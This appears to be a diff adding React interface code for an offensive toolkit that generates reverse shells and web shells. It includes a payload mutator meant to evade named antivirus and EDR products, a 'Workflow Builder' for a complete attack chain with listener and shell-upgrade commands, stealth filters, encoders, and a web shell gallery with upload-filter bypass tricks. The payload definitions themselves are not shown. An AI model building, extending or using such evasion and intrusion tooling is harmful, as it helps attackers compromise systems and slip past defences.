+          <div style={{marginTop:10,display:"flex",gap:8,alignItems:"flex-start"}}>
+            <pre style={{flex:1,margin:0,background:"rgba(0,255,170,0.02)",border:"1px solid rgba(0,255,170,0.08)",borderRadius:6,padding:"7px 10px",color:"#88cc88",fontFamily:"monospace",fontSize:11,whiteSpace:"pre-wrap"}}>{advisorResult.listener}</pre>
+            <CopyBtn text={advisorResult.listener}/>
+          </div>
+          {advisorResult.warning&&<div style={{marginTop:8,padding:"8px 10px",background:"rgba(255,136,0,0.04)",border:"1px solid rgba(255,136,0,0.15)",borderRadius:6,fontSize:10,color:"#665500"}}>⚠ {advisorResult.warning}</div>}
+          {advisorResult.alts?.length>0&&<div style={{marginTop:10}}><SL>ALTERNATIVES</SL>{advisorResult.alts.map(a=><div key={a.shellId} style={{background:"rgba(255,255,255,0.015)",border:"1px solid #0d1a0d",borderRadius:7,padding:"7px 10px",display:"flex",gap:10,marginBottom:4}}><span style={{color:"#4a6a4a",fontFamily:"monospace",fontSize:11,fontWeight:600,flexShrink:0}}>{a.shell.name}</span><span style={{color:"#2a4a2a",fontSize:10,lineHeight:1.5}}>{a.reason}</span></div>)}</div>}
+          <button onClick={()=>{setAdvisorResult(null);setSituation("");}} style={{marginTop:8,background:"none",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>← Ask another</button>
+        </div>}
+      </div>}
+      {/* ── MUTATOR ── */}
+      {mode==="mutator"&&<div style={{display:"flex",flexDirection:"column",gap:12}}>
+        <div>
+          <SL>PAYLOAD TO MUTATE / OBFUSCATE</SL>
+          <textarea value={payload} onChange={e=>setPayload(e.target.value)} placeholder="Paste your reverse shell payload here…" rows={4} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical",lineHeight:1.6}}/>
+        </div>
+        <div>
+          <SL>TARGET AV / EDR (optional)</SL>
+          <input value={target} onChange={e=>setTarget(e.target.value)} placeholder="e.g. Windows Defender + CrowdStrike Falcon, or just 'Defender'" style={{...IS,width:"100%",boxSizing:"border-box"}}/>
+        </div>
+        <button onClick={runMutator} disabled={!payload.trim()||loading} style={{background:"rgba(0,255,170,0.1)",border:"1px solid rgba(0,255,170,0.3)",borderRadius:7,color:"#00ffaa",padding:"8px 18px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>{loading?"⟳ Mutating…":"🧬 Mutate Payload"}</button>
+        {error&&<div style={{background:"rgba(255,68,68,0.05)",border:"1px solid rgba(255,68,68,0.2)",borderRadius:8,padding:"10px",color:"#ff4444",fontSize:11}}>{error}</div>}
+        {mutResult&&<div style={{background:"rgba(0,255,170,0.02)",border:"1px solid rgba(0,255,170,0.12)",borderRadius:10,padding:"14px"}}>
+          <div style={{color:"#00ffaa",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:10}}>✓ MUTATED PAYLOAD</div>
+          <pre style={{margin:0,fontFamily:"'Fira Code',monospace",fontSize:11,color:"#88cc88",whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.7}}>{mutResult}</pre>
+          <button onClick={()=>{setMutResult(null);setPayload("");}} style={{marginTop:10,background:"none",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>← Mutate another</button>
+        </div>}
+      </div>}
+      {/* ── ANALYZER ── */}
+      {mode==="analyzer"&&<div style={{display:"flex",flexDirection:"column",gap:12}}>
+        <div>
+          <SL>PASTE COMMAND OUTPUT (id, uname -a, whoami /priv, systeminfo, etc.)</SL>
+          <textarea value={cmdOutput} onChange={e=>setCmdOutput(e.target.value)} placeholder="uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)&#10;uname -a: Linux web01 5.4.0-163 #180 SMP Tue Sep 5 13:55:52 UTC 2023 x86_64&#10;&#10;Or paste: whoami /priv, systeminfo, sudo -l output, etc." rows={6} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical",lineHeight:1.6}}/>
+        </div>
+        <button onClick={runAnalyzer} disabled={!cmdOutput.trim()||loading} style={{background:"rgba(0,255,170,0.1)",border:"1px solid rgba(0,255,170,0.3)",borderRadius:7,color:"#00ffaa",padding:"8px 18px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>{loading?"⟳ Analyzing…":"🔬 Analyze Output"}</button>
+        {error&&<div style={{background:"rgba(255,68,68,0.05)",border:"1px solid rgba(255,68,68,0.2)",borderRadius:8,padding:"10px",color:"#ff4444",fontSize:11}}>{error}</div>}
+        {anaResult&&<div style={{background:"rgba(0,255,170,0.02)",border:"1px solid rgba(0,255,170,0.12)",borderRadius:10,padding:"14px"}}>
+          <div style={{color:"#00ffaa",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:10}}>✓ ANALYSIS RESULTS</div>
+          <pre style={{margin:0,fontFamily:"'Fira Code',monospace",fontSize:11,color:"#88cc88",whiteSpace:"pre-wrap",wordBreak:"break-word",lineHeight:1.7}}>{anaResult}</pre>
+          <button onClick={()=>{setAnaResult(null);setCmdOutput("");}} style={{marginTop:10,background:"none",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>← Analyze another</button>
+        </div>}
+      </div>}
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   SHORTCUTS MODAL
+══════════════════════════════════════════════════════ */
+function ShortcutsModal({onClose}){
+  const groups=[
+    {label:"NAVIGATION",items:[{key:"/",desc:"Focus search"},{key:"?",desc:"This shortcuts panel"},{key:"Esc",desc:"Close modal / collapse all"},{key:"1–8",desc:"Switch tabs"}]},
+    {label:"TOOLS",items:[{key:"H",desc:"Toggle copy history panel"},{key:"D",desc:"Open diff viewer"},{key:"P",desc:"Print cheatsheet"}]},
+    {label:"FILTERS",items:[{key:"Stealth slider",desc:"Filter by minimum stealth"},{key:"OS filter",desc:"Linux / Windows / macOS"},{key:"Encoder",desc:"URL / Base64 / Hex encoding"}]},
+  ];
+  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.75)",zIndex:600,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)"}} onClick={onClose}>
+    <div onClick={e=>e.stopPropagation()} style={{background:"#090f09",border:"1px solid rgba(0,255,170,0.15)",borderRadius:14,padding:"24px",width:500,maxWidth:"95vw",maxHeight:"85vh",overflowY:"auto"}}>
+      <div style={{display:"flex",justifyContent:"space-between",marginBottom:18}}>
+        <div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>⌨ Keyboard Shortcuts</div>
+        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:20}}>×</button>
+      </div>
+      {groups.map(g=><div key={g.label} style={{marginBottom:16}}>
+        <div style={{color:"#1e3a1e",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:8,borderBottom:"1px solid #0a140a",paddingBottom:5}}>{g.label}</div>
+        {g.items.map(i=><div key={i.key} style={{display:"flex",alignItems:"center",gap:10,marginBottom:5}}>
+          <kbd style={{background:"rgba(0,255,170,0.06)",border:"1px solid rgba(0,255,170,0.15)",borderRadius:5,padding:"3px 8px",color:"#00ffaa",fontFamily:"monospace",fontSize:10,minWidth:70,textAlign:"center",flexShrink:0}}>{i.key}</kbd>
+          <span style={{color:"#4a6a4a",fontSize:11}}>{i.desc}</span>
+        </div>)}
+      </div>)}
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   WORKFLOW BUILDER
+══════════════════════════════════════════════════════ */
+function WorkflowPanel({ip,port,onClose}){
+  const[os,setOs]=useState(null);const[shell,setSh]=useState(null);
+  const getRec=()=>{
+    if(!os||!shell)return null;
+    const map={linux:{bash:{id:"bash-tcp",up:true},python:{id:"py3-pty",up:false},nc:{id:"nc-mkfifo",up:true},perl:{id:"perl-tcp",up:true}},
+              windows:{ps:{id:"ps-enc",up:false},nc:{id:"nc-e",up:false},python:{id:"py3-socket",up:false}}};
+    const m=map[os]?.[shell]||{id:"bash-tcp",up:true};
+    const s=SHELLS_BASE.find(x=>x.id===m.id)||SHELLS_BASE[0];
+    return{shell:s,listener:s.pair.replace(/PORT/g,port||"4444"),upgrade:m.up};
+  };
+  const rec=getRec();
+  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.7)",zIndex:500,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)"}} onClick={onClose}>
+    <div onClick={e=>e.stopPropagation()} style={{background:"#0a140a",border:"1px solid rgba(0,255,170,0.2)",borderRadius:14,padding:"24px",width:500,maxWidth:"95vw",maxHeight:"85vh",overflowY:"auto"}}>
+      <div style={{display:"flex",justifyContent:"space-between",marginBottom:18}}>
+        <div><div style={{color:"#00ffaa",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>⚡ Workflow Builder</div><div style={{color:"#2a4a2a",fontSize:11,marginTop:2}}>Answer 2 questions → get a complete attack workflow</div></div>
+        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:18}}>×</button>
+      </div>
+      <div style={{marginBottom:14}}>
+        <SL>01 / TARGET OS</SL>
+        <div style={{display:"flex",gap:8}}>
+          {[{id:"linux",label:"🐧 Linux"},{id:"windows",label:"⊞ Windows"}].map(o=><button key={o.id} onClick={()=>{setOs(o.id);setSh(null);}} style={{flex:1,background:os===o.id?"rgba(0,255,170,0.1)":"rgba(255,255,255,0.03)",border:`1px solid ${os===o.id?"rgba(0,255,170,0.3)":"#1a2a1a"}`,borderRadius:8,padding:"12px",color:os===o.id?"#00ffaa":"#3a5a3a",cursor:"pointer",fontSize:13,fontFamily:"monospace"}}>{o.label}</button>)}
+        </div>
+      </div>
+      {os&&<div style={{marginBottom:14}}>
+        <SL>02 / AVAILABLE ON TARGET</SL>
+        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
+          {(os==="linux"?[{id:"bash",label:"❯ Bash"},{id:"python",label:"⌬ Python3"},{id:"nc",label:"⊛ Netcat"},{id:"perl",label:"◇ Perl"}]:[{id:"ps",label:"⊞ PowerShell"},{id:"nc",label:"⊛ Netcat"},{id:"python",label:"⌬ Python"}]).map(o=><button key={o.id} onClick={()=>setSh(o.id)} style={{background:shell===o.id?"rgba(0,255,170,0.08)":"rgba(255,255,255,0.02)",border:`1px solid ${shell===o.id?"rgba(0,255,170,0.25)":"#1a2a1a"}`,borderRadius:7,padding:"10px",color:shell===o.id?"#00ffaa":"#3a5a3a",cursor:"pointer",fontSize:12,fontFamily:"monospace",textAlign:"left"}}>{o.label}</button>)}
+        </div>
+      </div>}
+      {rec?.shell&&<div style={{background:"rgba(0,255,170,0.03)",border:"1px solid rgba(0,255,170,0.15)",borderRadius:10,padding:"16px"}}>
+        <div style={{color:"#00ffaa",fontSize:11,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:12}}>✓ RECOMMENDED WORKFLOW</div>
+        {[["01","Start listener (ATTACKER)",rec.listener],["02",`Run on TARGET — ${rec.shell.name}`,rec.shell.gen({ip,port})],rec.upgrade&&["03","Upgrade shell (TARGET)","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],rec.upgrade&&["04","Fix TTY (ATTACKER — after Ctrl+Z)","stty raw -echo; fg\nexport TERM=xterm"]].filter(Boolean).map(([n,lbl,cmd])=><div key={n} style={{marginBottom:12}}>
+          <div style={{color:"#2a4a2a",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:4}}>{n} — {lbl.toUpperCase()}</div>
+          <div style={{display:"flex",gap:8}}><pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:6,padding:"7px 10px",color:"#00ffaa",fontFamily:"monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.6}}>{cmd}</pre><CopyBtn text={cmd}/></div>
+        </div>)}
+        {rec.shell.caveat&&<div style={{padding:"8px 10px",background:"rgba(255,215,0,0.04)",border:"1px solid rgba(255,215,0,0.1)",borderRadius:6,fontSize:10,color:"#665500"}}>⚠ {rec.shell.caveat}</div>}
+      </div>}
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   SHELL CARD
+══════════════════════════════════════════════════════ */
+function ShellCard({shell,ip,port,encoder,expanded,onToggle,isFav,onToggleFav,addHistory}){
+  const raw=shell.gen({ip:ip||"10.10.10.10",port:port||"4444"});
+  const output=ENCODERS[encoder].fn(raw);
+  return <div style={{background:expanded?"rgba(0,255,170,0.025)":"rgba(255,255,255,0.01)",border:`1px solid ${expanded?"rgba(0,255,170,0.2)":"#0d1a0d"}`,borderRadius:10,overflow:"hidden",transition:"border .15s,background .15s"}}>
+    <div onClick={onToggle} style={{display:"flex",alignItems:"center",gap:10,padding:"10px 14px",cursor:"pointer",userSelect:"none"}}>
+      <div style={{width:7,height:7,borderRadius:"50%",flexShrink:0,background:expanded?"#00ffaa":"#0d1a0d",border:"1px solid rgba(0,255,170,0.25)",transition:"background .15s"}}/>
+      <div style={{flex:1,minWidth:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:6,flexWrap:"wrap"}}>
+          <span style={{color:"#cce8cc",fontSize:13,fontWeight:600,fontFamily:"monospace"}}>{shell.name}</span>
+          {shell.custom&&<span style={{fontSize:9,color:"#ff8800",background:"rgba(255,136,0,0.08)",border:"1px solid rgba(255,136,0,0.2)",borderRadius:3,padding:"1px 5px",fontFamily:"monospace"}}>CUSTOM</span>}
+          <div style={{display:"flex",gap:3}}>{shell.os?.map(o=><span key={o} title={OS_LABEL[o]} style={{fontSize:10}}>{OS_ICON[o]}</span>)}</div>
+          {shell.tags?.includes("2026")&&<span style={{fontSize:9,color:"#00ffaa",background:"rgba(0,255,170,0.08)",border:"1px solid rgba(0,255,170,0.2)",borderRadius:3,padding:"1px 5px",fontFamily:"monospace",fontWeight:700}}>2026</span>}
+          {shell.tags?.includes("ssl")&&<span style={{fontSize:9,color:"#00aaff",background:"rgba(0,170,255,0.08)",border:"1px solid rgba(0,170,255,0.2)",borderRadius:3,padding:"1px 5px",fontFamily:"monospace"}}>SSL</span>}
+        </div>
+        <div style={{color:"#2a4a2a",fontSize:11,marginTop:2,fontFamily:"monospace",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{shell.info}</div>
+      </div>
+      <StealthDots n={shell.stealth}/>
+      <button onClick={e=>{e.stopPropagation();onToggleFav&&onToggleFav(shell.id);}} style={{background:"none",border:"none",cursor:"pointer",fontSize:13,opacity:isFav?1:0.25,transition:"all .15s",padding:"2px 4px",lineHeight:1}} onMouseEnter={e=>e.currentTarget.style.opacity="0.7"} onMouseLeave={e=>e.currentTarget.style.opacity=isFav?"1":"0.25"}>⭐</button>
+      <span style={{color:"#1e3a1e",fontSize:9}}>{expanded?"▲":"▼"}</span>
+    </div>
+    {expanded&&<div onClick={e=>e.stopPropagation()} style={{borderTop:"1px solid #0d1a0d",background:"rgba(0,0,0,0.2)"}}>
+      <div style={{padding:"12px 14px 0"}}>
+        <CopyBtn text={output} label="⎘ COPY PAYLOAD" onCopy={t=>addHistory&&addHistory({text:t,label:shell.name,ts:Date.now()})}/>
+        <div style={{marginTop:8}}><PayloadBox text={output}/></div>
+        <div style={{display:"flex",gap:4,flexWrap:"wrap",marginTop:8,marginBottom:10}}>
+          {shell.tags?.map(t=><span key={t} style={{fontSize:9,color:"#2a4a2a",background:"rgba(255,255,255,0.02)",border:"1px solid #0e1e0e",borderRadius:4,padding:"1px 6px",fontFamily:"monospace"}}>#{t}</span>)}
+        </div>
+      </div>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:1,borderTop:"1px solid #0d1a0d"}}>
+        <InfoRow icon="⚙" label="REQUIRES ON TARGET" value={shell.req} color="#ffd700"/>
+        <InfoRow icon="⊕" label="LISTENER COMMAND" value={shell.pair.replace(/PORT/g,port||"4444").replace(/IP/g,ip||"10.10.10.10")} color="#00ffaa" mono copyable={!shell.pair.startsWith("Pair")}/>
+        {shell.caveat&&<div style={{gridColumn:"1 / -1"}}><InfoRow icon="⚠" label="NOTES & CAVEATS" value={shell.caveat} color="#ff8800"/></div>}
+      </div>
+    </div>}
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   REVERSE SHELLS TAB
+══════════════════════════════════════════════════════ */
+function RevShellsTab({ip,port,favorites,onToggleFav,customShells,onAddCustom,addHistory}){
+  const allShells=useMemo(()=>[...SHELLS_BASE,...customShells],[customShells]);
+  const[cat,setCat]=useState("all");const[search,setSearch]=useState("");const[osf,setOsf]=useState("all");
+  const[enc,setEnc]=useState("none");const[stealth,setStealth]=useState(1);const[expanded,setExpanded]=useState(null);
+  const[showUpg,setShowUpg]=useState(false);const[showSSL,setShowSSL]=useState(false);
+  const[showOnboard,setShowOnboard]=useLS("rvs2_onboard",true);const[showImport,setShowImport]=useState(false);
+  const searchRef=useRef(null);
+  useEffect(()=>{
+    const h=e=>{
+      if(e.key==="/"&&document.activeElement.tagName!=="INPUT"&&document.activeElement.tagName!=="TEXTAREA"){e.preventDefault();searchRef.current?.focus();}
+      if(e.key==="Escape")setExpanded(null);
+    };
+    window.addEventListener("keydown",h);return()=>window.removeEventListener("keydown",h);
+  },[]);
+  const counts=useMemo(()=>{const c={};allShells.forEach(s=>{c[s.cat]=(c[s.cat]||0)+1;});return c;},[allShells]);
+  const filtered=useMemo(()=>{
+    const q=search.trim().toLowerCase();
+    return allShells.filter(s=>{
+      if(cat==="starred")return favorites.includes(s.id);
+      if(cat!=="all"&&s.cat!==cat)return false;
+      if(osf!=="all"&&!s.os?.includes(osf))return false;
+      if(s.stealth&&s.stealth<stealth)return false;
+      if(q)return s.name.toLowerCase().includes(q)||s.info.toLowerCase().includes(q)||s.tags.some(t=>t.includes(q))||s.cat.includes(q);
+      return true;
+    });
+  },[cat,osf,stealth,search,favorites,allShells]);
+  const toggle=useCallback(id=>setExpanded(p=>p===id?null:id),[]);
+  const hasSSL=filtered.some(s=>s.tags?.includes("ssl"));
+  return <div style={{display:"flex",flex:1,overflow:"hidden",minHeight:0}}>
+    <aside style={{width:185,flexShrink:0,borderRight:"1px solid #0a140a",background:"rgba(2,5,2,0.7)",overflowY:"auto",paddingBottom:28}}>
+      <div style={{padding:"13px 13px 5px",color:"#162a16",fontSize:9,letterSpacing:2}}>CATEGORIES</div>
+      <button onClick={()=>setCat("starred")} style={{width:"100%",textAlign:"left",background:cat==="starred"?"rgba(255,200,0,0.06)":"none",border:"none",borderLeft:`2px solid ${cat==="starred"?"#ffd700":"transparent"}`,padding:"7px 13px",color:cat==="starred"?"#ffd700":"#2a4a2a",cursor:"pointer",fontSize:12,fontFamily:"monospace",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
+        <span>⭐ Starred</span>{favorites.length>0&&<span style={{fontSize:9,color:"#665500",background:"rgba(255,200,0,0.08)",padding:"1px 5px",borderRadius:3}}>{favorites.length}</span>}
+      </button>
+      {CATS.map(c=><button key={c.id} onClick={()=>setCat(c.id)} style={{width:"100%",textAlign:"left",background:"none",border:"none",borderLeft:`2px solid ${cat===c.id?"#00ffaa":"transparent"}`,padding:"7px 13px",color:cat===c.id?"#00ffaa":"#2a4a2a",cursor:"pointer",fontSize:12,fontFamily:"monospace",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
+        <span><span style={{marginRight:6,opacity:.6}}>{c.icon}</span>{c.label}</span>
+        {c.id!=="all"&&counts[c.id]&&<span style={{fontSize:9,color:"#162a16",background:"rgba(255,255,255,0.03)",padding:"1px 5px",borderRadius:3}}>{counts[c.id]}</span>}
+      </button>)}
+      <div style={{padding:"14px 13px 5px",color:"#162a16",fontSize:9,letterSpacing:2,marginTop:4}}>OS TARGET</div>
+      {[{id:"all",label:"All OS"},{id:"linux",label:"🐧 Linux"},{id:"windows",label:"⊞ Windows"},{id:"macos",label:"⌘ macOS"}].map(o=><button key={o.id} onClick={()=>setOsf(o.id)} style={{width:"100%",textAlign:"left",background:"none",border:"none",padding:"5px 13px",color:osf===o.id?"#b8ccb8":"#2a4a2a",cursor:"pointer",fontSize:11,fontFamily:"monospace",display:"flex",alignItems:"center",gap:6}}>
+        <span style={{fontSize:9,color:osf===o.id?"#00ffaa":"#162a16"}}>{osf===o.id?"◉":"○"}</span>{o.label}
+      </button>)}
+      <div style={{padding:"14px 13px 4px",color:"#162a16",fontSize:9,letterSpacing:2}}>MIN STEALTH</div>
+      <div style={{padding:"0 13px 10px"}}>
+        <div style={{display:"flex",justifyContent:"space-between",color:STEALTH_CFG[stealth-1].color,fontSize:10,marginBottom:5}}><span>{STEALTH_CFG[stealth-1].label.toUpperCase()}</span><span>{stealth}/5</span></div>
+        <input type="range" min={1} max={5} value={stealth} onChange={e=>setStealth(Number(e.target.value))} style={{width:"100%",accentColor:"#00ffaa",cursor:"pointer"}}/>
+        <div style={{display:"flex",justifyContent:"space-between",color:"#162a16",fontSize:9,marginTop:2}}><span>LOUD</span><span>SILENT</span></div>
+      </div>
+      <div style={{padding:"8px 13px 5px",color:"#162a16",fontSize:9,letterSpacing:2}}>ENCODER</div>
+      {Object.entries(ENCODERS).map(([k,e])=><button key={k} onClick={()=>setEnc(k)} style={{width:"100%",textAlign:"left",background:"none",border:"none",padding:"5px 13px",color:enc===k?"#00ffaa":"#2a4a2a",cursor:"pointer",fontSize:11,fontFamily:"monospace",display:"flex",alignItems:"center",gap:6}}>
+        <span style={{fontSize:9}}>{enc===k?"◉":"○"}</span>{e.label}
+      </button>)}
+    </aside>
+    <main style={{flex:1,padding:"16px 22px",overflowY:"auto",minWidth:0}}>
+      {showOnboard&&<OnboardBanner onDismiss={()=>setShowOnboard(false)}/>}
+      <div style={{position:"relative",marginBottom:12}}>
+        <span style={{position:"absolute",left:11,top:"50%",transform:"translateY(-50%)",color:"#1e3a1e",fontSize:15,pointerEvents:"none"}}>⌕</span>
+        <input ref={searchRef} value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search shells, tags, OS, techniques… (press / to focus)" style={{...IS,width:"100%",boxSizing:"border-box",paddingLeft:34,height:40,fontSize:12}} onFocus={e=>e.target.style.borderColor="rgba(0,255,170,0.25)"} onBlur={e=>e.target.style.borderColor="#1a2a1a"}/>
+      </div>
+      <div style={{display:"flex",gap:6,marginBottom:14,flexWrap:"wrap",alignItems:"center"}}>
+        <button onClick={()=>setShowUpg(v=>!v)} style={{background:showUpg?"rgba(255,215,0,0.07)":"rgba(255,255,255,0.02)",border:`1px solid ${showUpg?"rgba(255,215,0,0.25)":"#0d1a0d"}`,borderRadius:6,color:showUpg?"#ffd700":"#2a4a2a",padding:"5px 12px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>⬆ TTY Upgrade</button>
+        {hasSSL&&<button onClick={()=>setShowSSL(v=>!v)} style={{background:showSSL?"rgba(0,170,255,0.07)":"rgba(255,255,255,0.02)",border:`1px solid ${showSSL?"rgba(0,170,255,0.25)":"#0d1a0d"}`,borderRadius:6,color:showSSL?"#00aaff":"#2a4a2a",padding:"5px 12px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>🔒 SSL Setup</button>}
+        <button onClick={()=>setExpanded(null)} style={{background:"none",border:"1px solid #0d1a0d",borderRadius:6,color:"#1e3a1e",padding:"5px 12px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>◻ Collapse</button>
+        <button onClick={()=>setShowImport(true)} style={{background:"rgba(255,136,0,0.06)",border:"1px solid rgba(255,136,0,0.2)",borderRadius:6,color:"#ff8800",padding:"5px 12px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>+ Import Shell</button>
+      </div>
+      {showUpg&&<UpgradePanel/>}{showSSL&&<SSLPanel ip={ip}/>}
+      <div style={{display:"flex",gap:8,marginBottom:14,flexWrap:"wrap"}}>
+        {[{label:"TOTAL",v:allShells.length,color:"#00ffaa"},{label:"SHOWN",v:filtered.length,color:"#ffd700"},{label:"SILENT",v:allShells.filter(s=>s.stealth>=5).length,color:"#88ff00"},{label:"CUSTOM",v:customShells.length,color:"#ff8800"}].map(s=><div key={s.label} style={{background:"rgba(255,255,255,0.015)",border:"1px solid #0d1a0d",borderRadius:8,padding:"7px 13px"}}><div style={{fontSize:9,color:"#1e3a1e",letterSpacing:2,marginBottom:2}}>{s.label}</div><div style={{fontSize:21,fontWeight:700,color:s.color,lineHeight:1}}>{s.v}</div></div>)}
+      </div>
+      {filtered.length===0?<div style={{textAlign:"center",padding:"60px 0"}}><div style={{color:"#1e3a1e",fontSize:28,marginBottom:12}}>◈</div><div style={{color:"#1e3a1e",fontSize:13}}>No shells match your filters</div></div>
+        :<div style={{display:"flex",flexDirection:"column",gap:6}}>{filtered.map(shell=><ShellCard key={shell.id} shell={shell} ip={ip} port={port} encoder={enc} expanded={expanded===shell.id} onToggle={()=>toggle(shell.id)} isFav={favorites.includes(shell.id)} onToggleFav={onToggleFav} addHistory={addHistory}/>)}</div>}
+    </main>
+    {showImport&&<CustomShellModal onSave={onAddCustom} onClose={()=>setShowImport(false)}/>}
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   WEB SHELLS TAB
+══════════════════════════════════════════════════════ */
+function WebShellsTab({ip,port}) {
+  const[active,setActive]=useState(null);
+  const[lang,setLang]=useState("all");
+  const LANG_COLORS={php:"#7a4fcf",aspx:"#0078d4",jsp:"#e76f00",asp:"#888"};
+  const filtered=WEB_SHELLS.filter(s=>lang==="all"||s.lang===lang);
+  const resolve=c=>c.replace(/__IP__/g,ip||"10.10.10.10").replace(/__PORT__/g,port||"4444");
+  return(
+    <div style={{padding:"20px 22px"}}>
+      <div style={{marginBottom:16}}>
+        <h2 style={{color:"#cce8cc",fontSize:16,fontWeight:700,margin:"0 0 4px",fontFamily:"monospace",letterSpacing:1}}>🐚 Web Shell Gallery</h2>
+        <p style={{color:"#2a4a2a",fontSize:11,margin:0,lineHeight:1.6}}>Upload-and-execute shells for web RCE. Each includes upload filter bypass tips, exact usage commands, and detection risk.</p>
+      </div>
+      <div style={{background:"rgba(255,100,0,0.03)",border:"1px solid rgba(255,100,0,0.12)",borderRadius:9,padding:"12px 16px",marginBottom:16}}>
+        <div style={{color:"#ff8800",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:8}}>⬆ UPLOAD FILTER BYPASS REFERENCE</div>
+        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(180px,1fr))",gap:6}}>
+          {[["Extension tricks",".php5 .phtml .phar .shtml .php7"],["Content-Type","Change MIME to image/jpeg in Burp"],["Double extension","shell.php.jpg → depends on config"],["Null byte (legacy)","shell.php%00.jpg → truncates at \\0"],["Magic bytes","Prepend \\xff\\xd8\\xff (JPEG header)"],["WAR packaging","jar -cvf s.war s.jsp → Tomcat Manager"]].map(([k,v])=>(
+            <div key={k}><span style={{color:"#ff8800",fontSize:10,fontFamily:"monospace"}}>{k}: </span><span style={{color:"#554422",fontSize:10,fontFamily:"monospace"}}>{v}</span></div>
+          ))}
+        </div>
+      </div>
+      <div style={{display:"flex",gap:6,marginBottom:14,flexWrap:"wrap",alignItems:"center"}}>
+        {["all","php","aspx","jsp","asp"].map(l=><SelBtn key={l} label={l.toUpperCase()} active={lang===l} onClick={()=>setLang(l)}/>)}
+        <span style={{marginLeft:"auto",color:"#1e3a1e",fontSize:10,fontFamily:"monospace"}}>{filtered.length} shells</span>
+      </div>
+      <div style={{display:"flex",flexDirection:"column",gap:6}}>
+        {filtered.map(shell=>{
+          const isActive=active===shell.id;
+          const code=resolve(shell.code);
+          const lc=LANG_COLORS[shell.lang]||"#555";
+          const stealthCfg=STEALTH_CFG[shell.stealth-1];
+          return(
+            <div key={shell.id} style={{background:isActive?"rgba(0,255,170,0.02)":"rgba(255,255,255,0.01)",border:`1px solid ${isActive?"rgba(0,255,170,0.2)":"#0d1a0d"}`,borderRadius:10,overflow:"hidden",transition:"border .15s"}}>
+              <div onClick={()=>setActive(p=>p===shell.id?null:shell.id)} style={{display:"flex",alignItems:"center",gap:10,padding:"10px 14px",cursor:"pointer",userSelect:"none"}}>
+                <span style={{fontSize:9,fontWeight:700,fontFamily:"monospace",letterSpacing:1,color:lc,background:`${lc}18`,border:`1px solid ${lc}44`,borderRadius:4,padding:"2px 7px",flexShrink:0,textTransform:"uppercase"}}>{shell.lang}</span>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{color:"#cce8cc",fontSize:13,fontWeight:600,fontFamily:"monospace"}}>{shell.name}</div>
+                  <div style={{color:"#2a4a2a",fontSize:11,marginTop:2,fontFamily:"monospace",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{shell.description}</div>
+                </div>
+                <div style={{display:"flex",alignItems:"center",gap:5,flexShrink:0}}>
+                  <div style={{display:"flex",gap:2}}>{[1,2,3,4,5].map(i=><div key={i} style={{width:5,height:12,borderRadius:2,background:i<=shell.stealth?stealthCfg.color:"#111e11"}}/>)}</div>
+                  <span style={{fontSize:9,color:stealthCfg.color,fontFamily:"monospace",fontWeight:700,letterSpacing:1}}>{stealthCfg.label.toUpperCase()}</span>
+                </div>
+                <span style={{color:"#1e3a1e",fontSize:9}}>{isActive?"▲":"▼"}</span>
+              </div>
+              {isActive&&(
+                <div onClick={e=>e.stopPropagation()} style={{borderTop:"1px solid #0d1a0d",background:"rgba(0,0,0,0.2)"}}>
+                  <div style={{padding:"12px 14px 0"}}><PayloadBox text={code} lang={shell.lang}/></div>
